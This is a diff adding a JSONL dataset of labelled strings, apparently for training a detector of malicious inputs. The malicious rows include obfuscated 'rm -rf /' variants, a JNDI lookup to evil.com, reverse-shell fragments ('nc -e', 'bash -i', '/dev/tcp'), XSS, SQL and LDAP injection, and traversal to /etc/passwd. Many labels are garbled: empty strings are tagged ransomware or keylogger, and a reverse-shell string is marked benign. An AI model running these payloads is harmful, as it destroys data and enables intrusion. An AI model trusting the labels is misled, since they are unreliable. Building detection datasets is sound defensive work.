@@ -1,0 +1,2050 @@
+{"text": "DELETE FROM ; bypass", "label": 1, "category": "sql_deletion"}
+{"text": "/*\n/etc/passwd", "label": 1, "category": "sensitive_file_access"}
+{"text": "${jndi:ldap://evil.com/a}​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "text  =  'hello  world'.title()", "label": 0, "category": "benign_python"}
+{"text": "';%20--", "label": 1, "category": "sql_comment_injection"}
+{"text": "eval(shell_exec)", "label": 1, "category": "shell_execution"}
+{"text": "message  =  'rm  -rf  /tmp'", "label": 0, "category": "benign_hard"}
+{"text": "import  os;  os.systеm('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "How  does  this  function  work?", "label": 0, "category": "benign_text"}
+{"text": "echo 'TRUNCATE'", "label": 1, "category": "sql_truncation"}
+{"text": "ping  -c  3  google.com", "label": 0, "category": "benign_shell"}
+{"text": "rm    -rf    /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "import​ os; os.system('rm -rf ​/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "# cat README.md", "label": 0, "category": "benign_shell"}
+{"text": "How  do  I  install  Python?", "label": 0, "category": "benign_text"}
+{"text": "/*\n'; --", "label": 1, "category": "sql_comment_injection"}
+{"text": "*)(uid=*))(|(uid=*", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "SELECT  *  FROM  users  WHERE  id  =  1", "label": 0, "category": "benign_sql"}
+{"text": "What  does  this  error  mean?", "label": 0, "category": "benign_text"}
+{"text": "${jndi:ldаp://evil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "x  =  1  +  2", "label": 0, "category": "benign_python"}
+{"text": "rm​ -rf /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "${jndi:ldap://evil.com/a}‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "DROP​ TABLE users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "SELECT​ * FROM users WHERE id=1 OR ​1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "evаl('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "#  Note:  This  uses  eval()  internally,  but  it's  safe", "label": 0, "category": "benign_hard"}
+{"text": "<!-- rm -rf", "label": 1, "category": "destructive_file_operation"}
+{"text": "..\\ REM bypass", "label": 1, "category": "path_traversal_windows"}
+{"text": "; nc -e", "label": 1, "category": "reverse_shell"}
+{"text": "<script>alert('xss')</script>‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "exeс('rm -rf /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "REM UNION SELECT", "label": 1, "category": "sql_injection"}
+{"text": "import​ os; os.system('rm -rf ​/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "ping  -c  3  google.com", "label": 0, "category": "benign_shell"}
+{"text": "../../../etc/pаsswd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "ps aux", "label": 0, "category": "benign_shell"}
+{"text": "SELECT​ * FROM users WHERE id=1 OR 1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": " ; bypass", "label": 1, "category": "credential_dumping"}
+{"text": "wc  -l  file.txt", "label": 0, "category": "benign_shell"}
+{"text": "data  =  json.load(open('data.json'))", "label": 0, "category": "benign_python"}
+{"text": "status  =  system_info.get_uptime()", "label": 0, "category": "benign_hard"}
+{"text": "<ScRipt>alert('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "Can  you  help  me  with  this?", "label": 0, "category": "benign_text"}
+{"text": "passthru || echo success", "label": 1, "category": "passthru_execution"}
+{"text": "# wc -l file.txt", "label": 0, "category": "benign_shell"}
+{"text": "wget\nhttp://", "label": 1, "category": "remote_code_fetch"}
+{"text": "/*\n/dev/tcp", "label": 1, "category": "tcp_redirection"}
+{"text": "import​ os; os.system('rm -rf ​/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": ";\n/etc/passwd", "label": 1, "category": "sensitive_file_access"}
+{"text": "Eval(", "label": 1, "category": "code_execution"}
+{"text": "../ <!-- bypass", "label": 1, "category": "path_traversal"}
+{"text": "SELECT  name,  email  FROM  users", "label": 0, "category": "benign_sql"}
+{"text": "exec('rm\\x20-rf\\x20/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "Please explain this code", "label": 0, "category": "benign_text"}
+{"text": "rm​ -rf /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "<script>alert('xss')</script>‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "How  does  this  function  work?", "label": 0, "category": "benign_text"}
+{"text": "rm\\x20-rf\\x20/", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "exec('rm -rf /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "<!--\nbash -i", "label": 1, "category": "interactive_shell"}
+{"text": "powershell -Command \"/etc/shadow\"", "label": 1, "category": "sensitive_file_access"}
+{"text": "еxec('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "/* ..\\", "label": 1, "category": "path_traversal_windows"}
+{"text": "exec(..\\)", "label": 1, "category": "path_traversal_windows"}
+{"text": "import  os;  os.systеm('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "/* ", "label": 1, "category": "privilege_escalation"}
+{"text": "def  calculate_sum(a,  b):  return  a  +  b", "label": 0, "category": "benign_python"}
+{"text": "popen( <!-- bypass", "label": 1, "category": "process_execution"}
+{"text": "${jndi:ldap://evil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "SELECT  name,  email  FROM  users", "label": 0, "category": "benign_sql"}
+{"text": "ping  -c  3  google.com", "label": 0, "category": "benign_shell"}
+{"text": "What  is  the  difference  between  X  and  Y?", "label": 0, "category": "benign_text"}
+{"text": "def  hello():  return  'world'", "label": 0, "category": "benign_python"}
+{"text": "-- ", "label": 1, "category": "sql_time_based"}
+{"text": "# head -n 10 file.txt", "label": 0, "category": "benign_shell"}
+{"text": "ls  -lh", "label": 0, "category": "benign_shell"}
+{"text": "rm -rf -- bypass", "label": 1, "category": "destructive_file_operation"}
+{"text": "with  open('file.txt',  'r')  as  f:  content  =  f.read()", "label": 0, "category": "benign_python"}
+{"text": "; passthru", "label": 1, "category": "passthru_execution"}
+{"text": "sort  file.txt", "label": 0, "category": "benign_shell"}
+{"text": "result  =  sum([1,  2,  3])", "label": 0, "category": "benign_python"}
+{"text": "../../../etc/pаsswd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "result  =  sum([1,  2,  3])", "label": 0, "category": "benign_python"}
+{"text": "​隐藏​字符‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "# tail -f log.txt", "label": 0, "category": "benign_shell"}
+{"text": "DROP TABLE // bypass", "label": 1, "category": "sql_destructive"}
+{"text": "cat  README.md", "label": 0, "category": "benign_shell"}
+{"text": "sh -c \"\"", "label": 1, "category": "reverse_shell"}
+{"text": "ls  -R", "label": 0, "category": "benign_shell"}
+{"text": "SELECT * FRоM users WHERE id=1 OR 1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "whoami", "label": 0, "category": "benign_shell"}
+{"text": "/etc/passwd -- bypass", "label": 1, "category": "sensitive_file_access"}
+{"text": "../../../еtc/passwd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "-- wget http://", "label": 1, "category": "remote_code_fetch"}
+{"text": "uname  -a", "label": 0, "category": "benign_shell"}
+{"text": "python -c \"DROP TABLE\"", "label": 1, "category": "sql_destructive"}
+{"text": "eval('alert(1)')​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "ruby -e \"\"", "label": 1, "category": "ransomware_pattern"}
+{"text": "Chmod 777", "label": 1, "category": "permission_escalation"}
+{"text": "DROP​ TABLE users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "SELECT  category,  COUNT(*)  FROM  products  GROUP  BY  category", "label": 0, "category": "benign_sql"}
+{"text": "import​ os; os.system('rm -rf /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "for  item  in  items:  process(item)", "label": 0, "category": "benign_python"}
+{"text": "rm​ -rf ​/", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "exec('rm​ -rf ​/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "#  TODO:  Remove  debug  line:  system('ls')", "label": 0, "category": "benign_hard"}
+{"text": "grep  'pattern'  file.txt", "label": 0, "category": "benign_shell"}
+{"text": "uniq  file.txt", "label": 0, "category": "benign_shell"}
+{"text": "exec('rm​ -rf /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "node -e \"/etc/passwd\"", "label": 1, "category": "sensitive_file_access"}
+{"text": "<!-- DROP TABLE", "label": 1, "category": "sql_destructive"}
+{"text": "while  count  <  10:  count  +=  1", "label": 0, "category": "benign_python"}
+{"text": "​隐藏​字符​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "SELECT  name,  email  FROM  users", "label": 0, "category": "benign_sql"}
+{"text": "<script>alеrt('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "AaAaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "eval('alert(1)')​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": " && echo success", "label": 1, "category": "network_scanning"}
+{"text": "DROP TABLE backup;", "label": 1, "category": "sql_destructive"}
+{"text": "Show  me  an  example", "label": 0, "category": "benign_text"}
+{"text": "result  =  sum([1,  2,  3])", "label": 0, "category": "benign_python"}
+{"text": "SELECT  category,  COUNT(*)  FROM  products  GROUP  BY  category", "label": 0, "category": "benign_sql"}
+{"text": "UNION%20SELECT", "label": 1, "category": "sql_injection"}
+{"text": "еval('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "eval(/dev/tcp)", "label": 1, "category": "tcp_redirection"}
+{"text": "еxec('rm -rf /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "<!-- UNION SELECT", "label": 1, "category": "sql_injection"}
+{"text": "passthru", "label": 1, "category": "passthru_execution"}
+{"text": "curl  -I  https://example.com", "label": 0, "category": "benign_shell"}
+{"text": "echo  'Hello  World'", "label": 0, "category": "benign_shell"}
+{"text": "REM curl http://", "label": 1, "category": "remote_code_fetch"}
+{"text": "delete from", "label": 1, "category": "sql_deletion"}
+{"text": "#\n", "label": 1, "category": "credential_dumping"}
+{"text": "eVaL('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "*)(uid=*))(|(uid=*", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "import​ os; os.system('rm -rf /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "from  datetime  import  datetime", "label": 0, "category": "benign_python"}
+{"text": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "exec( -- bypass", "label": 1, "category": "code_execution"}
+{"text": "pwd", "label": 0, "category": "benign_shell"}
+{"text": "ls  -lh", "label": 0, "category": "benign_shell"}
+{"text": "# echo $HOME", "label": 0, "category": "benign_shell"}
+{"text": "SELECT  category,  COUNT(*)  FROM  products  GROUP  BY  category", "label": 0, "category": "benign_sql"}
+{"text": "// ", "label": 1, "category": "reverse_shell"}
+{"text": "result  =  system_check.is_healthy()", "label": 0, "category": "benign_hard"}
+{"text": "DROP  TаBLE  users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": " && echo success", "label": 1, "category": "sql_time_based"}
+{"text": "evаl('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "def  hello():  return  'world'", "label": 0, "category": "benign_python"}
+{"text": "SELECT * FROM users WHERE id=1 OR 1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "ruby -e \"\"", "label": 1, "category": "network_scanning"}
+{"text": "", "label": 1, "category": "ransomware_pattern"}
+{"text": "date", "label": 0, "category": "benign_shell"}
+{"text": "import\\x20\\x20os;\\x20\\x20os.system('rm\\x20\\x20-rf\\x20\\x20/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "bash -c 'rm -rf'", "label": 1, "category": "destructive_file_operation"}
+{"text": "free  -m", "label": 0, "category": "benign_shell"}
+{"text": "<ScRipt>alert('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "/ETC/PASSWD", "label": 1, "category": "sensitive_file_access"}
+{"text": "import  os;  os.system('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "What  is  the  difference  between  X  and  Y?", "label": 0, "category": "benign_text"}
+{"text": "echo  $HOME", "label": 0, "category": "benign_shell"}
+{"text": "curl\thttp://", "label": 1, "category": "remote_code_fetch"}
+{"text": "*)(uid%3D*))(|(uid%3D*", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "/dev/tcp | echo success", "label": 1, "category": "tcp_redirection"}
+{"text": "Can  you  review  my  code?", "label": 0, "category": "benign_text"}
+{"text": "SELECT  *  FROM  users  WHERE  id%3D1  OR  1%3D1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "result  =  sum([1,  2,  3])", "label": 0, "category": "benign_python"}
+{"text": "UNION SELECT -- bypass", "label": 1, "category": "sql_injection"}
+{"text": "while  count  <  10:  count  +=  1", "label": 0, "category": "benign_python"}
+{"text": ";\nnc -e", "label": 1, "category": "reverse_shell"}
+{"text": "<!-- ..\\", "label": 1, "category": "path_traversal_windows"}
+{"text": "# tail -f log.txt", "label": 0, "category": "benign_shell"}
+{"text": "SеLECT * FROM users WHERE id=1 OR 1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "How  do  I  install  Python?", "label": 0, "category": "benign_text"}
+{"text": "Please  explain  this  code", "label": 0, "category": "benign_text"}
+{"text": "--\nwget http://", "label": 1, "category": "remote_code_fetch"}
+{"text": "rm-rf", "label": 1, "category": "destructive_file_operation"}
+{"text": "//\npassthru", "label": 1, "category": "passthru_execution"}
+{"text": "def factorial(n): return 1 if n <= 1 else n * factorial(n-1)", "label": 0, "category": "benign_python"}
+{"text": "AaAaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "rm​ -rf /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "bash%20-i", "label": 1, "category": "interactive_shell"}
+{"text": "SеLECT  *  FROM  users  WHERE  id=1  OR  1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "eVaL('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "UPDATE  users  SET  last_login  =  NOW()  WHERE  id  =  1", "label": 0, "category": "benign_sql"}
+{"text": "SELECT​ * FROM users WHERE id=1 OR 1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "--\n", "label": 1, "category": "keylogger_installation"}
+{"text": "--\n/etc/shadow", "label": 1, "category": "sensitive_file_access"}
+{"text": "tail  -f  log.txt", "label": 0, "category": "benign_shell"}
+{"text": "UPDATE  products  SET  price  =  99.99  WHERE  id  =  123", "label": 0, "category": "benign_sql"}
+{"text": "curl  -I  https://example.com", "label": 0, "category": "benign_shell"}
+{"text": "date", "label": 0, "category": "benign_shell"}
+{"text": "exec%28", "label": 1, "category": "code_execution"}
+{"text": "rm  -rf  /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "# wc -l file.txt", "label": 0, "category": "benign_shell"}
+{"text": "#\npopen(", "label": 1, "category": "process_execution"}
+{"text": "# cat README.md", "label": 0, "category": "benign_shell"}
+{"text": " ", "label": 1, "category": "network_scanning"}
+{"text": "def  factorial(n):  return  1  if  n  <=  1  else  n  *  factorial(n-1)", "label": 0, "category": "benign_python"}
+{"text": "${jndi:ldap://еvil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "output  =  safe_eval('1+1')", "label": 0, "category": "benign_hard"}
+{"text": "result  =  code_executor.run('safe_code')", "label": 0, "category": "benign_hard"}
+{"text": "DROP​ TABLE users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "AaAaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "import​ os; os.system('rm -rf ​/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "import os; os.system('rm -rf /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "<script>аlert('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "${jndi:ldаp://evil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "# cat README.md", "label": 0, "category": "benign_shell"}
+{"text": "uptime", "label": 0, "category": "benign_shell"}
+{"text": "​隐藏​字符​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "result  =  evaluator.calculate('2+2')", "label": 0, "category": "benign_hard"}
+{"text": "ls  -lh", "label": 0, "category": "benign_shell"}
+{"text": "rm​ -rf ​/", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "words  =  'hello  world'.split()", "label": 0, "category": "benign_python"}
+{"text": "DROP  TABLE  users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "SELECT  *  FROM  products  WHERE  price  >  100", "label": 0, "category": "benign_sql"}
+{"text": "status  =  system_info.get_uptime()", "label": 0, "category": "benign_hard"}
+{"text": "exec('rm​ -rf ​/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "DELETE FROM # bypass", "label": 1, "category": "sql_deletion"}
+{"text": "SELECT​ * FROM users WHERE id=1 OR 1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "/etc/passwd # bypass", "label": 1, "category": "sensitive_file_access"}
+{"text": "chmod 777 ; echo success", "label": 1, "category": "permission_escalation"}
+{"text": "/* ", "label": 1, "category": "sql_comment_bypass"}
+{"text": "sort  file.txt", "label": 0, "category": "benign_shell"}
+{"text": "ls  -la", "label": 0, "category": "benign_shell"}
+{"text": "", "label": 1, "category": "privilege_escalation"}
+{"text": "DROP  TаBLE  users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "Please  explain  this  code", "label": 0, "category": "benign_text"}
+{"text": "DROP  TABLE  users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "data  =  json.load(open('data.json'))", "label": 0, "category": "benign_python"}
+{"text": "; eval(", "label": 1, "category": "code_execution"}
+{"text": " ", "label": 1, "category": "keylogger_installation"}
+{"text": "*)(uid=*))(|(uid=*​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "uname  -a", "label": 0, "category": "benign_shell"}
+{"text": "impоrt  os;  os.system('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "rm​ -rf ​/", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "sort  file.txt", "label": 0, "category": "benign_shell"}
+{"text": "bash -i", "label": 1, "category": "interactive_shell"}
+{"text": "/*\npassthru", "label": 1, "category": "passthru_execution"}
+{"text": "message  =  'rm  -rf  /tmp'", "label": 0, "category": "benign_hard"}
+{"text": "​隐藏​字符‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "exec(wget http://)", "label": 1, "category": "remote_code_fetch"}
+{"text": "/etc/shadow REM bypass", "label": 1, "category": "sensitive_file_access"}
+{"text": "words  =  'hello  world'.split()", "label": 0, "category": "benign_python"}
+{"text": "How  can  I  improve  my  code?", "label": 0, "category": "benign_text"}
+{"text": "eval( ; bypass", "label": 1, "category": "code_execution"}
+{"text": "exec('rm​ -rf ​/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "bash -c 'DELETE FROM'", "label": 1, "category": "sql_deletion"}
+{"text": "еval('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "*)(Uid=*))(|(uid=*", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "--\n/etc/passwd", "label": 1, "category": "sensitive_file_access"}
+{"text": "tree -L 2", "label": 0, "category": "benign_shell"}
+{"text": "еxec('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "python -c \"wget http://\"", "label": 1, "category": "remote_code_fetch"}
+{"text": "import  math", "label": 0, "category": "benign_python"}
+{"text": "message  =  'rm  -rf  /tmp'", "label": 0, "category": "benign_hard"}
+{"text": " || echo success", "label": 1, "category": "privilege_escalation"}
+{"text": "SELECT  *  FRоM  users  WHERE  id=1  OR  1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "result  =  system_check.is_healthy()", "label": 0, "category": "benign_hard"}
+{"text": "df  -h", "label": 0, "category": "benign_shell"}
+{"text": "shell_exec -- bypass", "label": 1, "category": "shell_execution"}
+{"text": "#  Note:  This  uses  eval()  internally,  but  it's  safe", "label": 0, "category": "benign_hard"}
+{"text": "${jndi:ldap://еvil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "аAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "uname  -a", "label": 0, "category": "benign_shell"}
+{"text": "DROP  TABLE  users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "nc -e # bypass", "label": 1, "category": "reverse_shell"}
+{"text": "<!--\nshell_exec", "label": 1, "category": "shell_execution"}
+{"text": "# whoami", "label": 0, "category": "benign_shell"}
+{"text": "pwd", "label": 0, "category": "benign_shell"}
+{"text": "# echo $HOME", "label": 0, "category": "benign_shell"}
+{"text": "node -e \"\"", "label": 1, "category": "ransomware_pattern"}
+{"text": "import  math", "label": 0, "category": "benign_python"}
+{"text": "python -c \"passthru\"", "label": 1, "category": "passthru_execution"}
+{"text": "What  is  the  difference  between  X  and  Y?", "label": 0, "category": "benign_text"}
+{"text": "${jndi:ldаp://evil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "DROP\\x20\\x20TABLE\\x20\\x20users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "# pwd", "label": 0, "category": "benign_shell"}
+{"text": "BASH -I", "label": 1, "category": "interactive_shell"}
+{"text": "exec(eval()", "label": 1, "category": "code_execution"}
+{"text": " | echo success", "label": 1, "category": "credential_dumping"}
+{"text": "// ", "label": 1, "category": "sql_union_injection"}
+{"text": "bash -c 'wget http://'", "label": 1, "category": "remote_code_fetch"}
+{"text": "-- rm -rf", "label": 1, "category": "destructive_file_operation"}
+{"text": "SELECT  COUNT(*)  FROM  orders", "label": 0, "category": "benign_sql"}
+{"text": "TRUNCATE /* bypass", "label": 1, "category": "sql_truncation"}
+{"text": "tail  -f  log.txt", "label": 0, "category": "benign_shell"}
+{"text": "date", "label": 0, "category": "benign_shell"}
+{"text": "text  =  'hello  world'.title()", "label": 0, "category": "benign_python"}
+{"text": "passthru // bypass", "label": 1, "category": "passthru_execution"}
+{"text": "result  =  evaluator.calculate('2+2')", "label": 0, "category": "benign_hard"}
+{"text": "ps  aux", "label": 0, "category": "benign_shell"}
+{"text": " // bypass", "label": 1, "category": "network_scanning"}
+{"text": "What does this error mean?", "label": 0, "category": "benign_text"}
+{"text": "DROP  TABLE  users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "find . -name '*.py'", "label": 0, "category": "benign_shell"}
+{"text": "SELECT * FROM products WHERE price > 100", "label": 0, "category": "benign_sql"}
+{"text": "head  -n  10  file.txt", "label": 0, "category": "benign_shell"}
+{"text": "..\\ // bypass", "label": 1, "category": "path_traversal_windows"}
+{"text": "evаl('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "while  count  <  10:  count  +=  1", "label": 0, "category": "benign_python"}
+{"text": "<!--\n", "label": 1, "category": "sql_comment_bypass"}
+{"text": "head  -n  10  file.txt", "label": 0, "category": "benign_shell"}
+{"text": "eval('alert(1)')‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "REM /dev/tcp", "label": 1, "category": "tcp_redirection"}
+{"text": "eval(chmod 777)", "label": 1, "category": "permission_escalation"}
+{"text": "DROP  TABLе  users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "date", "label": 0, "category": "benign_shell"}
+{"text": "#\nshell_exec", "label": 1, "category": "shell_execution"}
+{"text": "EXEC(", "label": 1, "category": "code_execution"}
+{"text": "<!-- system(", "label": 1, "category": "system_call"}
+{"text": "items = [x for x in range(10)]", "label": 0, "category": "benign_python"}
+{"text": "rm  -rf  /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "//\n", "label": 1, "category": "credential_dumping"}
+{"text": "DROP TABLE users; -- SQL injection", "label": 1, "category": "sql_destructive"}
+{"text": "# pwd", "label": 0, "category": "benign_shell"}
+{"text": "import​ os; os.system('rm -rf /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "shell_exec || echo success", "label": 1, "category": "shell_execution"}
+{"text": "../../../etc/passwd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "echo 'curl http://'", "label": 1, "category": "remote_code_fetch"}
+{"text": "def  factorial(n):  return  1  if  n  <=  1  else  n  *  factorial(n-1)", "label": 0, "category": "benign_python"}
+{"text": "REM\nwget http://", "label": 1, "category": "remote_code_fetch"}
+{"text": "wget  --spider  https://example.com", "label": 0, "category": "benign_shell"}
+{"text": "tree  -L  2", "label": 0, "category": "benign_shell"}
+{"text": " // bypass", "label": 1, "category": "sql_comment_bypass"}
+{"text": "rm​ -rf ​/", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "example_code  =  'bash  -i  >&  /dev/tcp/...'", "label": 0, "category": "benign_hard"}
+{"text": "INSERT  INTO  users  (name,  email)  VALUES  ('John',  'john@example.com')", "label": 0, "category": "benign_sql"}
